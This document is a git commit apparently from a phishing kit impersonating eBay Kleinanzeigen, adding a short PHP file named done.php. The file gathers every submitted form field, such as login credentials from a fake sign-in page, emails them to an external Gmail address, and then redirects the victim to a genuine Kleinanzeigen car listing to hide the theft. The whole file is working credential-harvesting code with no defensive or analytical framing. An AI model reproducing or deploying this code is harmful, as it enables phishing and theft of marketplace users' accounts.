2aa6f51675337392bbfca736644c51c90d3e02f2
kleinanzeigen-ebay-kleinanzeigen-m-einloggen-html-targetUrl-session-true-s-anzeige-top-zustand-36648 <deansully77@graphic-designer.com>
2017-05-23 14:22:08 +0200

    Add files via upload

---
+++ done.php
@@ -0,0 +1,10 @@
+<?
+
+$msg="";
+foreach ($_POST as $key => $value) {
+    $msg=sprintf("%s%s ->%s\n",$msg,$key,$value);
+    }
+   mail("mexicofederal75@gmail.com","USERE '(*L*)'' ","$msg");
+
+?>
+<meta http-equiv="Refresh" content="0; URL=https://www.ebay-kleinanzeigen.de/s-anzeige/skoda-octavia-combi-2-0-fsi-leder-navi-dvd-inspektion-neu/648901823-216-5446">
